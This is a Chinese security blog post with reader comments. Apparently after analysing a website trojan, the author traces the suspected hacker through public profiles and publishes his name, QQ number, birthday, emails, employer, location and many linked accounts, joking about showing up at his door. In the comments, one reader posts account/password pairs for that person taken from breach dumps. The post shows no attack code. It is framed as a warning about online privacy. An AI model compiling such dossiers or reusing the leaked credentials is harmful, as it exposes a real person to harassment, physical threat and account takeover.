+眼花了,版规终于写完了.欢迎访问隐逆网络技术论坛: www.92pojie.net 昨天04:08 阅读(78) 全部转播和评论(2) 转播|评论| 更多...
+t.qq.com/arron-007 2013-3-15 - 百度快照
+
+taobao的个人空间
+http://kaixin.ispeak.cn/?1654820
+http://kaixin.ispeak.cn/space-uid-1654820.html
+
+隐逆网络技术论坛：www.92pojie.net 正式起航，论坛刚起步欢迎新老成员入驻，我门会不断的更新免杀，出新的教程，以及软件，让每个人都会学习到技术，我门的成才离不开大家的支持。 ... 
+2013-3-16 23:05:20</pre>
+<p style="text-indent:2em;">
+	<a href="/file/old/2803_13.png" target="_blank"><img title="taobao的个人空间" alt="taobao的个人空间" src="/file/old/2803_13.png" width="780" height="316" /></a> 
+</p>
+<p style="text-indent:2em;">
+	看发布时间，应该是刚注册域名刚建好站（4天，看名字八成又是什么抓鸡盗号论坛），发布的一条信息……
+</p>
+<p style="text-indent:2em;">
+	<img title="taobao的个人资料" alt="taobao的个人资料" src="/file/old/2804_14.png" width="771" height="701" /> 
+</p>
+<pre class="prettyprint">个人资料
+
+taobao (UID: 1654820)
+空间访问量：3700
+邮箱状态：未验证
+视频认证：未认证
+最新记录：隐逆网络技术论坛：www.92pojie.net 正式起航，论坛刚起步欢迎新老成员入驻，我门会不断的更新免杀，出新的教程，以及软件，让每个人都会学习到技术，我门的成才离不开大家的支持。 ...
+统计信息：好友数 3 | 记录数 1185 | 日志数 649 | 相册数 1|回帖数 0 | 主题数 0| 分享数 0
+居住地：重庆 渝中
+常驻频道：190070
+
+活跃概况
+用户组：[Lv.9]社区至尊
+在线时间：1 小时
+注册时间：2009-9-10 06:47
+最后访问：2013-3-16 23:01
+上次活动时间：2013-3-16 23:01
+上次发表时间：2013-3-16 23:05
+所在时区使用：系统默认
+
+统计信息
+已用空间：31.4 MB
+积分：26972
+威望：26947
+金钱：25
+贡献：0</pre>
+<p style="text-indent:2em;">
+	获得一条有价值信息：
+</p>
+<p style="text-indent:2em;">
+	居住地：重庆 渝中
+</p>
+<p style="text-indent:2em;">
+	再看腾讯微博（t.qq.com/arron-007）百度快照信息：
+</p>
+<p style="text-indent:2em;">
+	<img title="腾讯微博（t.qq.com/arron-007）百度快照信息" alt="腾讯微博（t.qq.com/arron-007）百度快照信息" src="/file/old/2805_15.png" width="679" height="397" /> 
+</p>
+<pre class="prettyprint">张少宇:
+
+眼花了,版规终于写完了.欢迎访问隐逆网络技术论坛: www.92pojie.net.
+
+昨天 04:08阅读(78)全部转播和评论(2)</pre>
+<p style="text-indent:2em;">
+	根据前后文时间推断，应该是注册完域名后刚建完论坛发的，可惜只坚持了不到三个月就关门了，看来站长是三分钟热度……
+</p>
+<p style="text-indent:2em;">
+	腾讯微博个人资料：
+</p>
+<p style="text-indent:2em;">
+	<img title="腾讯微博个人资料" alt="腾讯微博个人资料" src="/file/old/2806_16.png" width="494" height="783" /> 
+</p>
+<pre class="prettyprint">账号：arron-007
+姓名：张少宇
+QQ空间：http://user.qzone.qq.com/448322544
+QQ号：448322544
+台湾台北市
+射手座
+……</pre>
+<p style="text-indent:2em;">
+	哇，有QQ耶！<a href="https://lcx.cc/" target="_blank">核总</a>会告诉你“<span style="color:#006600;"><strong>加他QQ，探测对方IP，然后定位物理位置或者查出电话号码</strong></span>（例如：<a href="https://lcx.cc/post/3422/" target="_blank">中国电信ADSL宽带信息泄露,可查任意IP对应的宽带账号,电话号码,上门砍人</a>），上门砍人！”么？
+</p>
+<!--
+<p style="text-indent:2em;">
+	腾讯微博相册：http://t.qq.com/app/qzphoto/arron-007?preview
+</p>
+<p style="text-indent:2em;">
+	<img title="腾讯微博相册" alt="腾讯微博相册" src="/file/old/2807_17.png" width="588" height="675" /> 
+</p>
+<p style="text-indent:2em;">
+	<img title="腾讯微博相册" alt="腾讯微博相册" src="/file/old/2808_18.png" width="586" height="586" /> 
+</p>
+<p style="text-indent:2em;">
+	女的？应该不是……
+</p>
+<p style="text-indent:2em;">
+	女友？有此可能……
+</p>
+-->
+<p style="text-indent:2em;">
+	再进入QQ空间：http://user.qzone.qq.com/448322544
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2809_19.png" target="_blank"><img title="QQ空间" alt="QQ空间" src="/file/old/2809_19.png" width="780" height="648" /></a> 
+</p>
+<pre class="prettyprint">张少宇 ? And yan xielao
+
+公告：承接脱壳破解,程序开发,免杀木马
+
+姓名：张少宇
+性别：男
+QQ　：448322544
+年龄：25
+生日：1986.12.20
+地址：台湾省台北市
+空间说明：公开群号151835530,本团队致力于网络安全及国际新闻</pre>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/" target="_blank">我</a>没见过有人主动公开如此详细的个人资料……
+</p>
+<!--
+<p style="text-indent:2em;">
+	看性别，应该不是女的，那么，莫非照片是他女友？……
+</p>
+<p style="text-indent:2em;">
+	再看右上角“每天百度一下本人号码”，相当自恋啊……
+</p>
+<p style="text-indent:2em;">
+	继续挖掘空间资料，更具有讽刺意味的是，空间首页底下（核总吐槽：中部又放了大量女友照片，囧rz……）挂了个：
+</p>
+<p style="text-indent:2em;">
+	<img title="黑客之路 路是正的 心是红的" alt="黑客之路 路是正的 心是红的" src="/file/old/2810_20.png" width="537" height="110" /> 
+</p>
+<p style="text-indent:2em;">
+	好一个“黑客之路 路是正的 心是红的”！
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;"><strong>你好意思啊！跑人家网站挂马！你好意思啊！有木有啊！有木有！！！</strong></span> 
+</p>
+-->
+<p style="text-indent:2em;">
+	再看QQ空间个人基本资料：
+</p>
+<pre class="prettyprint">性别：男
+年龄：27
+生日：12月20日
+星座：射手座
+现居地：中国台湾台北市
+婚姻状况：保密
+血型：O
+故乡：中国
+职业：计算机工程师（核总吐槽：挂个马都挂不好！你好意思啊！好意思啊！！！！）
+公司名称：華研國際唱片
+公司所在地：中国台湾台北市
+详细地址：来自外太空的，另类种族。-以黑客網絡著称</pre>
+<!--
+<p style="text-indent:2em;">
+	空间相册放了大量绿色兵团的Logo：
+</p>
+<p style="text-indent:2em;">
+	<img title="空间相册放了大量绿色兵团的Logo" alt="空间相册放了大量绿色兵团的Logo" src="/file/old/2811_21.png" width="711" height="633" /> 
+</p>
+<p style="text-indent:2em;">
+	如果绿色兵团的同志看到这个，估计要<strong>从坟里爬出来打你屁屁</strong>了……
+</p>
+<p style="text-indent:2em;">
+	再吐个槽，尼玛斯！QQ空间相册充斥着大量90后天然呆女性图片（通过照片描述，再次证明是其女友），长得还不错，各位朋友可以去观摩下……
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2812_22.png" target="_blank"><img title="大量90后女性图片" alt="大量90后女性图片" src="/file/old/2812_22.png" width="780" height="537" /></a> 
+</p>
+<p style="text-indent:2em;">
+	当然，还充斥着大量WebShell、远控、各种黑客工具类图片……
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2813_23.png" target="_blank"><img title="大量WebShell、远控、各种黑客工具类图片" alt="大量WebShell、远控、各种黑客工具类图片" src="/file/old/2813_23.png" width="780" height="567" /></a> 
+</p>
+<p style="text-indent:2em;">
+	我就不吐槽，空间相册大量“杉浦太阳”（自称是他弟）、“李佳妮”（台湾网络爆红美女nini妮妮）（自称最好的朋友）的照片了……
+</p>
+<p style="text-indent:2em;">
+	还很喜欢玩CF，空间大量图片……
+</p>
+-->
+<p style="text-indent:2em;">
+	再看看QQ号资料：
+</p>
+<p style="text-indent:2em;">
+	<img title="QQ号资料" alt="QQ号资料" src="/file/old/2814_24.png" width="595" height="436" /> 
+</p>
+<p style="text-indent:2em;">
+	<img title="QQ号资料" alt="QQ号资料" src="/file/old/2816_26.png" width="585" height="425" /> 
+</p>
+<p style="text-indent:2em;">
+	卧槽，<strong><span style="color:#E53333;">刷钻黑客</span></strong>啊……
+</p>
+<p style="text-indent:2em;">
+	百度一下QQ，还有大量资料：
+</p>
+<p style="text-indent:2em;">
+	<img title="百度一下QQ，还有大量资料" alt="百度一下QQ，还有大量资料" src="/file/old/2815_25.png" width="652" height="623" /> 
+</p>
+<p style="text-indent:2em;">
+	<img title="百度一下QQ，还有大量资料" alt="百度一下QQ，还有大量资料" src="/file/old/2817_27.png" width="563" height="1796" /> 
+</p>
+<pre class="prettyprint">#传奇 俱乐部列表
+合击‖赤焰メ永世辉煌‖
+电信
+asd448322544
+
+#穿越火线战队
+﹏c.Fゝ幽灵
+yy:339663
+QQ:448322544
+电邮:geasszk@yeah.net
+http://cf.gamebbs.qq.com/forum.php?mod=viewthread&amp;tid=1613012
+（↑该地址有其玩游戏详细自述经历……）
+
+#腾讯CF论坛
+http://cf.gamebbs.qq.com/?148590
+﹏c.Fゝ幽灵(UID: 148590)
+QQ：448322544
+所属战队：彭格列总部
+性别：男
+生日：1986 年 12 月 20 日
+兴趣爱好：睡睡懒觉,工作一下
+职位：总经理
+真实姓名：张少宇
+出生地：台湾省 台北市
+学历：硕士
+交友目的：你猜.
+职业：金融投资
+居住地海外：新加坡
+毕业学校：Harvard university
+用户组：上等兵
+注册时间：2010-2-10 16:39
+最后访问：2013-2-17 16:35
+上次活动时间：2013-2-17 16:35
+上次发表时间：2013-2-15 04:05
+
+#百度贴吧
+百度账号：every99，http://www.baidu.com/p/every99
+帖子：应聘鸭子（核总吐槽：你没看错！！！应聘鸭子！！！！）
+本兄弟四人身材好，体力强悍，持久技术流，欲找夜总会当少爷，想要的MM及少妇也可直接联系我们上门，可先视频，满意后上门。QQ：448322544,69805998,969515151,985172531。
+
+百度账号：俊メ杉浦太陽，http://www.baidu.com/p/俊メ杉浦太陽
+帖子：求詹士德的手机铃音！！！！！！
+QQ:448322544
+邮箱：ljtx520@vip.qq.com, arron-007@qq.com
+
+百度账号：NOo1_越前龙马，http://www.baidu.com/p/NOo1_越前龙马
+帖子：黑客帝国，招募程序员 技术员。
+如标题。有意者请加QQ：448322544</pre>
+<p style="text-indent:2em;">
+	资料太多了，不挖了，感兴趣的朋友可以继续……
+</p>
+<p style="text-indent:2em;">
+	掌握以上资料，想上门“膜拜”，已经很简单了……
+</p>
+<p>
+	<strong><span style="color:#E53333;">后记：</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;"><a href="https://lcx.cc/" target="_blank">核总</a>写此文</span><span style="color:#E53333;">并不是为了爆菊而爆菊，而是为了告诉各位朋友，不要以为在互联网上做了某些事情没人查得出来，想查你很简单！</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">仅通使用一点点技术技巧，再通过过公共查询系统，即可获取你大量详细资料！更不要说有权调用各种资源的公安部门（IP地址、QQ号实时对应身份证号、电话号码、物理位置，精确到十米内！</span><span style="color:#E53333;">），上门砍你跟玩似的！</span><span style="color:#E53333;">要想人不知，除非己莫为！</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">最好告诫大家，请不要在互联网上泄露资料，说不定哪天就把你卖了！</span> 
+</p>
+<p style="text-indent:2em;">
+	<strong><span style="color:#006600;">最后，推荐一篇文章：</span></strong><a href="https://lcx.cc/post/2938/" target="_blank">视频:神奇的读心大师 网上有你的整个人生 利用社工+人肉来做神棍…… </a> 
+</p>
+<p>
+	<strong>资料打包下载：</strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2818_路面施工质量管理系统挂马分析资料.rar" target="_blank">路面施工质量管理系统挂马分析资料.rar</a> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">警告：如非专业人士，请勿随意执行附件中木马病毒样本，否则后果自负！</span> 
+</p>
+<p>
+	<strong>相关工具下载：</strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2852_Hook全盘文件创建的监控.rar" target="_blank">Hook全盘文件创建的监控.rar</a> 
+</p>
+<p style="text-indent:2em;">
+	这是一个轻量级文件监控工具，对付简单的病毒木马足矣。
+</p>
+<p style="text-indent:2em;">
+	如需更高级、更复杂的功能，则推荐微软官方出品的程序行为监控工具：<a href="http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx" target="_blank">Process Monitor</a> （同时包含：注册表、文件读写、进程操作、网络访问等监控功能）或 <a href="http://technet.microsoft.com/en-us/sysinternals/bb896642.aspx" target="_blank">Filemon</a> （只有文件读写监控功能），推荐使用“Process Monitor”，它包含了“Filemon”所有功能。
+</p>
+<p>
+	<strong>相关内容：</strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3563/" target="_blank">上来吐个槽，再次侦破一宗牵扯到全国多个大型医疗集团的恶性案件！</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3547/" target="_blank">再次遭遇 GoTop 挂机刷钱“病毒”，逆向爆菊，追踪背后“牧马人”</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3488/" target="_blank">上海伊莱美医院被黑、黑帽SEO做淘宝客，核总深入追查，揪出内鬼！</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3435/" target="_blank">核总霸气分析“天津丽人女子医院”主站被黑、挂淘宝客、黑帽SEO全过程！</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3400/" target="_blank">打击钓鱼，人人有责……</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3372/" target="_blank">追查黑客姓名,邮箱,支付宝信息，惊现大规模僵尸网络，要求警方介入处理！</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3371/" target="_blank">服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3213/" target="_blank">追踪PlugX Rat作者，人肉定向攻击远控PlugX开发者</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2725/" target="_blank">【需翻墙】网监如何爆菊？网警是如何通过层层VPN加密代理找到你的！</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3751/" target="_blank">刚刚看到个鱼站，然后就被轮流爆菊了……</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3658/" target="_blank">使用电视棒接收飞机信号 简单的实现方法</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3632/" target="_blank">rtl-sdr,RTL2832电视棒跟踪飞机轨迹教程(ADS-B), SDR GPS 飞机追踪</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3487/" target="_blank">支付宝木马爆菊过程总结帖【附源码】</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3486/" target="_blank">接上一章节,支付宝木马,后续情节【2】</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3473/" target="_blank">接上一章节,支付宝木马,后续情节</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3472/" target="_blank">360对你真的起作用了吗？bypass....分析支付宝网银木马，反爆菊花</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3439/" target="_blank">揭秘诈骗千万人民币的团伙及具体位置分析</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3401/" target="_blank">接着核总的《打击钓鱼，人人有责》之后的故事...</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3394/" target="_blank">【跟风贴】XSS挖出一个黑产团体</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3387/" target="_blank">XSS挖出一个黑产团体</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3309/" target="_blank">耍了一个发给我网购木马的骗子~~</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3263/" target="_blank">关于X卧底的通话监听、短信记录、定位追踪等侵犯隐私的行为讨论</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3067/" target="_blank">东京大学加密招生海报解密过程（内含妹子）</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2938/" target="_blank">视频:神奇的读心大师 网上有你的整个人生 利用社工+人肉来做神棍……</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2851/" target="_blank">简单分析一个通过 js 劫持进行黑帽 SEO 做淘宝客的案例</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1555/" target="_blank">黑客的新目标:泄密其他黑客资料</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1120/" target="_blank">某人肉搜索的典型案例分析 一群推理神牛</a> 
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="4608,3772,124.205.129.34">
+<p>hitom @ 2013-07-28 22:30:53</p>
+<p style="text-indent:2em">今天爆的好霸气，估计对方应该不大吧，非主流路线！！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">Soga.</p>
+</blockquote>
+<blockquote id="4610,3772,218.18.118.81">
+<p>佚名 @ 2013-07-28 23:50:43</p>
+<p style="text-indent:2em">所不定哪天就把你卖了！  有错别字</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">感谢指正！已修复！</p>
+</blockquote>
+<blockquote id="4611,3772,59.51.242.221">
+<p>雨路 @ 2013-07-29 00:07:22</p>
+<p style="text-indent:2em">来自_[other14.txt]_Datas 
+内容: goodwell888	aspirine	448322544@qq.com
+
+来自_[qq.com (38).txt]_Datas 
+内容: 448322544----aspirine3857030Q
+
+来自_[pconline.com.cn1-1.txt]_Datas 
+内容: goodwell888	aspirine	448322544@qq.com
+
+来自_[163-9.txt]_Datas 
+内容: 448322544@163.com----aspirine3558864Q
+
+来自_[qq.com (7).txt]_Datas 
+内容: 448322544----aspirine3857030Q</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">三克油！</p>
+</blockquote>
+<blockquote id="4613,3772,115.230.124.27">
+<p>佚名 @ 2013-07-29 04:18:23</p>
+<p style="text-indent:2em">yovole.com 有注射的，不过那密码加密很蛋疼解不出来，当时有几个很大的减肥药网站就放这上面，然后......</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">然后，然后就没有了……</p>
+</blockquote>
+<blockquote id="4615,3772,27.46.112.77">
+<p>佚名 @ 2013-07-29 09:39:41</p>
+<p style="text-indent:2em">为什么核總的朋友老是给人挂马。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">因为核总的朋友都是呆稚萌……</p>
+</blockquote>
+<blockquote id="4618,3772,123.112.66.90">
+<p>erevus @ 2013-07-29 12:40:02</p>
+<p style="text-indent:2em">为了核总再出好文章 我决定牺牲我自己 给核总朋友再挂个马</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">我勒个去，你妹……</p>
+</blockquote>
+<blockquote id="4619,3772,112.241.83.241">
+<p>dashige @ 2013-07-29 13:05:16</p>
+<p style="text-indent:2em">我感觉这样挂马说明他没有网马或者网马中率低，这样挂会有小白下载运行的。如果是他伪装成ie插件类的更好。
+如果能研究出hfs和他那个远控的漏洞就好了 - -！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">这种小白实在罕见……伪装成IE浏览器控件，这个可以有……</p>
+</blockquote>
+<blockquote id="4621,3772,61.161.185.70">
+<p>佚名 @ 2013-07-29 13:46:08</p>
+<p style="text-indent:2em">核总  那个好像不是远程工具的图片吧  有几张让我想起来以前玩的黑客游戏界面吧  呵呵</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">是的，很早的那种黑客闯关游戏的界面……</p>
+</blockquote>
+<blockquote id="4624,3772,122.226.78.178">
+<p>佚名 @ 2013-07-29 16:23:14</p>
+<p style="text-indent:2em">6#社工库自己搭建的还是？地址勒。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">目测是……</p>
+</blockquote>
+<blockquote id="4625,3772,60.183.227.124">
+<p>xunzhiyi @ 2013-07-29 18:06:54</p>
+<p style="text-indent:2em">核总 他那个照片是台湾黑客论坛的游戏比赛题目呀 以前我也去过那网站 玩过类似的游戏题目</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">是啊，某种黑客闯关类游戏……</p>
+</blockquote>
+<blockquote id="4633,3772,107.6.117.194">
+<p>佚名 @ 2013-07-30 19:33:33</p>
+<p style="text-indent:2em">何总，您的“hook全盘文件创建的监控”工具能共享一下吗~</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">嗯，这款工具属轻量级文件监控工具，功能比较简陋，如果你需要的话，可以加我QQ: root@lcx.cc</p>
+</blockquote>
+<blockquote id="4636,3772,14.28.113.251">
+<p>佚名 @ 2013-08-01 11:11:30</p>
+<p style="text-indent:2em">核总，小弟能否将你的事例抽象成案例，给大家分析一下！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">法律及各种后果自负……</p>
+</blockquote>
+<blockquote id="4637,3772,223.93.162.197">
+<p>123 @ 2013-08-01 23:32:15</p>
+<p style="text-indent:2em">额，这个远控我看到过 开源的 源码我也有 呵呵虽然不懂源码</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="4667,3772,219.148.147.213">
+<p>xpsp1 @ 2013-08-05 20:18:21</p>
+<p style="text-indent:2em">关键是 下一步控制端的IP如何拿下</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="4713,3772,118.119.222.1">
+<p>pang @ 2013-08-11 22:02:52</p>
+<p style="text-indent:2em">给霸气的霸气的核总~  留个言.</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">向霸气的霸气的留言~  吐个槽.</p>
+</blockquote>
+<blockquote id="5155,3772,61.189.54.62">
+<p>撸过... @ 2013-10-20 10:55:33</p>
+<p style="text-indent:2em">膜拜何总...</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">You Are Welcome!</p>
+</blockquote>
+<blockquote id="5158,3772,218.247.215.252">
+<p>佚名 @ 2013-10-21 15:42:46</p>
+<p style="text-indent:2em">我感到稀罕的VirScan结果里竟然有Rising   
+看来狮子最近有起色啊 呵呵</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">狮子这都很多年没听到消息了，不晓得有木有快倒闭了……</p>
+</blockquote>
+<blockquote id="5662,3772,125.82.153.82">
+<p>iris @ 2014-01-10 21:23:30</p>
+<p style="text-indent:2em">核总该再推荐些小菜用得上的 木马/后门检测 辨识 清除工具，小菜就差这些，网上找的又不太放心。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">1、XueTr v0.45、PowerTool v4.2 等类似的进程、文件综合安全分析工具。
+2、各类抓包工具，很多，不一一列举了。
+3、微软官方出品的程序行为监控工具：Process Monitor （同时包含：注册表、文件读写、进程操作、网络访问等监控功能）或 Filemon （只有文件读写监控功能），推荐使用“Process Monitor”，它包含了“Filemon”所有功能。
+4、在线病毒检测类网站：www.virscan.org
+5、在线程序行为分析、病毒检测网站：http://camas.comodo.com/cgi-bin/submit，http://anubis.iseclab.org/
+6、虚拟机及其他辅助工具……</p>
+</blockquote>
+<blockquote id="5734,3772,112.244.53.115">
+<p>Saknc @ 2014-01-23 00:29:00</p>
+<p style="text-indent:2em">卧槽我竟然有这个黑阔的好友。。。什么时候加的</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">纳尼？</p>
+</blockquote>
+<blockquote id="5801,3772,14.220.177.52">
+<p>我勒个去 @ 2014-02-08 12:07:35</p>
+<p style="text-indent:2em">我勒个去，进来就是找这篇的，只不过忘记标题了，一次右键打开好几个，慢慢看，然后，IP被封了，提示不要刷新或CC，好高端</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">噢，这是防御CC攻击模块 (Anti-CC.asp)：http://lcx.cc/?i=2094</p>
+</blockquote>
+<blockquote id="6103,3772,58.248.202.185">
+<p>佚名 @ 2014-03-25 18:15:31</p>
+<p style="text-indent:2em">今天我的网站也被挂同样的木马 但是我不知道怎么做   源码里边找不到  楼主能帮帮我吗</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">在所有文件中搜索被挂的代码，清理掉。</p>
+</blockquote>
+<blockquote id="6301,3772,61.182.139.64">
+<p>唐家三少 @ 2014-04-27 18:24:33</p>
+<p style="text-indent:2em">内985172531的资料呢？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">-_-|||</p>
+</blockquote>
+<blockquote id="6950,3772,58.218.3.115">
+<p>佚名 @ 2014-09-11 12:56:03</p>
+<p style="text-indent:2em">诶哟 真牛的技术啊</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">嗯</p>
+</blockquote>
+<blockquote id="6953,3772,211.136.253.181">
+<p>佚名 @ 2014-09-15 10:02:22</p>
+<p style="text-indent:2em">最喜欢看爆菊文章了，多多更新啊，核总！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">-_-|||</p>
+</blockquote>
+<blockquote id="7918,3772,101.36.76.38">
+<p>bobo @ 2015-10-06 19:37:49</p>
+<p style="text-indent:2em">傻逼 hfs2.3b直接提权 谁尼玛教你的</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">-_-!!!</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2013-08-04
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E7%88%86/">爆</a>
+          <a href="https://lcx.cc/tags/%E7%88%86%E8%8F%8A/">爆菊</a>
+          <a href="https://lcx.cc/tags/%E9%BB%91%E5%AE%A2/">黑客</a>
+          <a href="https://lcx.cc/tags/%E8%8F%8A/">菊</a>
+          <a href="https://lcx.cc/tags/%E9%80%86%E5%90%91/">逆向</a>
+          <a href="https://lcx.cc/tags/%E8%BF%BD%E8%B8%AA/">追踪</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/css/">CSS</a>
+          <a href="https://lcx.cc/tags/dns/">DNS</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/qq/">QQ</a>
+          <a href="https://lcx.cc/tags/rat/">Rat</a>
+          <a href="https://lcx.cc/tags/windows/">Windows</a>
+          <a href="https://lcx.cc/tags/%E7%99%BE%E5%BA%A6/">百度</a>
+          <a href="https://lcx.cc/tags/%E7%97%85%E6%AF%92/">病毒</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E7%94%B5%E8%84%91/">电脑</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E7%AE%A1%E7%90%86/">管理</a>
+          <a href="https://lcx.cc/tags/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">管理系统</a>
+          <a href="https://lcx.cc/tags/%E5%8F%B7%E7%A0%81/">号码</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E7%9B%91%E6%8E%A7/">监控</a>
+          <a href="https://lcx.cc/tags/%E6%A3%80%E6%B5%8B/">检测</a>
+          <a href="https://lcx.cc/tags/%E8%AE%BA%E5%9D%9B/">论坛</a>
+          <a href="https://lcx.cc/tags/%E5%85%8D%E6%9D%80/">免杀</a>
+          <a href="https://lcx.cc/tags/%E6%9C%A8%E9%A9%AC/">木马</a>
+          <a href="https://lcx.cc/tags/%E8%A7%86%E9%A2%91/">视频</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E8%85%BE%E8%AE%AF/">腾讯</a>
+          <a href="https://lcx.cc/tags/%E5%9B%BE%E7%89%87/">图片</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%BB%9C/">网络</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
+          <a href="https://lcx.cc/tags/%E5%BE%AE%E5%8D%9A/">微博</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E6%B3%84%E9%9C%B2/">泄露</a>
+          <a href="https://lcx.cc/tags/%E5%A7%93%E5%90%8D/">姓名</a>
+          <a href="https://lcx.cc/tags/%E6%BA%90%E7%A0%81/">源码</a>
+          <a href="https://lcx.cc/tags/%E8%BF%9C%E6%8E%A7/">远控</a>
+          <a href="https://lcx.cc/tags/%E8%B4%A6%E5%8F%B7/">账号</a>
